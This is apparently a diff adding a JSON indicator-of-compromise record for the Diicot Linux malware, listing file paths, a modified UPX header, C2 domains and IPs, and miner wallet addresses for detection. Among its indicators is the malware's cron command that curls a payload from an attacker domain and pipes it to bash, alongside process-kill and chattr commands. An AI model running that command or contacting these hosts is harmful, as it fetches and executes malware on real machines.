@@ -1,0 +1,353 @@
+{
+  "malware_family": "Diicot",
+  "threat_actor": "Diicot",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "Diicot is a malware targeting Linux systems, often in cloud environments, via weak SSH credentials. It spreads using a custom UPX-packed Go binary, maintains persistence with cron jobs, and exfiltrates data to an HTTP C2. In non-cloud environments, it deploys an XMRig-based cryptominer.",
+  "mitre_techniques": [
+    "T1027.002",
+    "T1053.003",
+    "T1071.001",
+    "T1041",
+    "T1110.001",
+    "T1496.001"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_path",
+      "value": "/var/tmp/.update-logs/Update",
+      "context": "Primary payload, main logic and spreader.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/var/tmp/cache",
+      "context": "Reverse shell payload dropped by Update.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/var/tmp/.update-logs/.bisis",
+      "context": "OpenSSH banner grabbing scanner.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/var/tmp/.update-logs/fenta",
+      "context": "Output file containing unique IPs running OpenSSH.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/var/tmp/Documents/.diicot",
+      "context": "Payload downloaded and executed by black4 script.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "brute-retea",
+      "context": "Romanian word found in code/paths.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "brute-spreader.go",
+      "context": "Internal name for 'Update' payload from compilation artifacts.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "client.go",
+      "context": "Internal name for 'cache' reverse shell payload.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "payload.go",
+      "context": "Internal name for 'abc123' cryptomining payload.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 59 54 53 99 }",
+      "context": "Modified UPX magic header, replacing 'UPX!'.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "/root/skema/brute-spreader.go:218: E de la crontab uid0",
+      "context": "Decoded C2 error report for crontab failure.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "4.15.0-1013-azure",
+      "context": "Hardcoded string for Azure cloud environment detection.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "4.14.47-64.38.amzn2.x86_64",
+      "context": "Hardcoded string for Amazon cloud environment detection.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "x86_64-linode105",
+      "context": "Hardcoded string for Linode cloud environment detection.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "/var/tmp/.update-logs/./.bisis 2000 22 iplist",
+      "context": "Execution of the SSH banner scanner.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cat /var/tmp/.update-logs/banner.log | grep -a OpenSSH | awk '{print $1}' | sort | uniq > /var/tmp/.update-logs/fenta",
+      "context": "Command chain to parse scan results for OpenSSH hosts.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -s digital.digitaldatainsights.org/.x/black3 --connect-timeout 15 | bash > /dev/null 2>&1",
+      "context": "Persistence crontab entry '.c' to download and run payload.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "pidof cache | xargs kill -9 > /dev/null 2>&1",
+      "context": "Command from black4 script to kill old reverse shell process.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "chattr -iae /var/tmp/Documents/.diicot",
+      "context": "Command from black4 script to remove file attributes before replacement.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "awsgui",
+      "context": "Username and password combination from brute-force list.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "digital.digitaldatainsights.org",
+      "context": "Main payload server and part of cron download URL.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pauza.digitaldatainsights.org",
+      "context": "Reverse shell C2 server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "test.digitaldatainsights.org",
+      "context": "C2 and mining pool server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "87.120.116.35",
+      "context": "C2 server for reports and mining pool.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "80.76.51.5",
+      "context": "Main payload server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "87.120.114.219",
+      "context": "Hardcoded IP fallback for reverse shell C2.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "91.92.250.6",
+      "context": "Old payload server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/save-data",
+      "context": "C2 endpoint for receiving error and success reports.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/.x/black3",
+      "context": "Path for payload downloaded by '.c' cron job.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/.NzJjOTY",
+      "context": "Directory on payload server hosting malware components.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/.NzJjOTY/.balu",
+      "context": "Path to download 'cache' payload in black4 script.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/.NzJjOTY/kuak",
+      "context": "Path to download 'kuak' payload in black4 script.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/.NzJjOTY/.diicot",
+      "context": "Path to download '.diicot' payload in black4 script.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "curl/7.68.0",
+      "context": "Hardcoded user-agent in Go HTTP client for C2 error reports.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "ZEPHYR35u3wKAs4jLTGfGD4yDsJc92M3yRr3gEHCmRutfnDwfwgZizqF8q7en82SRR6BiNDfukphgayqw5CU5Pue36PQCKHx1qd1v",
+      "context": "Attacker's Zephyr wallet address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "87Fxj6UDiwYchWbn2k1mCZJxRxBC5TkLJQoP9EJ4E9V843Z9ySeKYi165Gfc2KjxZnKdxCkz7GKrvXkHE11bvBhD9dbMgQ",
+      "context": "Attacker's Monero (XMR) wallet address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "elf",
+    "script"
+  ]
+}
